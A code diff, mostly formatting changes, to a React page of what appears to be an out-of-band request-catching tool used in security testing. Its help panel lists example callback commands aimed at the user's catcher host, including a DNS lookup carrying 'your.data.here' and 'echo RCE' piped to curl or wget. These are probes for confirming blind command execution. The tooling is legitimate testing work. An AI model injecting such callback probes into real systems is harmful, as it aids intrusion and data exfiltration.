@@ -13,7 +13,7 @@ export class RequestsPage extends Component {
       user: null,
       selectedRequest: null,
       loading: true,
-      error: null
+      error: null,
     };
   }
 
@@ -45,7 +45,9 @@ export class RequestsPage extends Component {
     // parse url into host:port
     let url;
     try {
-      url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
+      url = new URL(
+        "http://" + (user?.domain || window.location.hostname) + "/",
+      );
     } catch {
       url = new URL("http://" + window.location.hostname + "/");
     }
@@ -67,34 +69,47 @@ print("Latest Request:", new_request)`;
     console.log(user);
     return (
       <div className="card card-w-title card-body">
-        {user?.requests && user?.selectedRequest !== undefined && 
-         (!user?.requests[user?.selectedRequest] || user?.requests?.length === 0) && (
+        {user?.requests &&
+          user?.selectedRequest !== undefined &&
+          (!user?.requests[user?.selectedRequest] ||
+            user?.requests?.length === 0) && (
             <div className="grid">
               <div className="col-12">
                 <h1>Awaiting requests</h1>
                 <p>How to make a request:</p>
-                <code>curl http://{user?.url || `${user?.subdomain}.${user?.domain}`}</code>
+                <code>
+                  curl http://
+                  {user?.url || `${user?.subdomain}.${user?.domain}`}
+                </code>
                 <br />
                 <br />
                 <code>
                   curl http://{user.domain}/r/
-                  {user?.subdomain || 'default'}/
+                  {user?.subdomain || "default"}/
                 </code>
                 <br />
                 <br />
                 <code>
-                  curl -X POST --data hello http://{user?.url || `${user?.subdomain}.${user?.domain}`}
+                  curl -X POST --data hello http://
+                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                 </code>
                 <br />
                 <br />
-                <code>nslookup your.data.here.{user?.url || `${user?.subdomain}.${user?.domain}`}</code>
-                <br />
-                <br />
-                <code>echo RCE | curl -d @- {user?.url || `${user?.subdomain}.${user?.domain}`}</code>
+                <code>
+                  nslookup your.data.here.
+                  {user?.url || `${user?.subdomain}.${user?.domain}`}
+                </code>
                 <br />
                 <br />
                 <code>
-                  wget --post-data "$(echo RCE)" -O- {user?.url || `${user?.subdomain}.${user?.domain}`}
+                  echo RCE | curl -d @-{" "}
+                  {user?.url || `${user?.subdomain}.${user?.domain}`}
+                </code>
+                <br />
+                <br />
+                <code>
+                  wget --post-data "$(echo RCE)" -O-{" "}
+                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                 </code>
                 <br />
                 <br />
@@ -116,7 +131,8 @@ print("Latest Request:", new_request)`;
                 <CopyButton
                   text={content.replace(
                     "********",
-                    localStorage.getItem(`token_${user.subdomain}`) || localStorage.getItem("token"),
+                    localStorage.getItem(`token_${user.subdomain}`) ||
+                      localStorage.getItem("token"),
                   )}
                 />
                 <EditorComponent
@@ -130,12 +146,10 @@ print("Latest Request:", new_request)`;
               </div>
             </div>
           )}
-        {user.requests && 
-         user?.selectedRequest !== undefined && 
-         user?.requests[user?.selectedRequest] && (
-            <RequestInfo
-              request={user.requests[user.selectedRequest]}
-            />
+        {user.requests &&
+          user?.selectedRequest !== undefined &&
+          user?.requests[user?.selectedRequest] && (
+            <RequestInfo request={user.requests[user.selectedRequest]} />
           )}
       </div>
     );
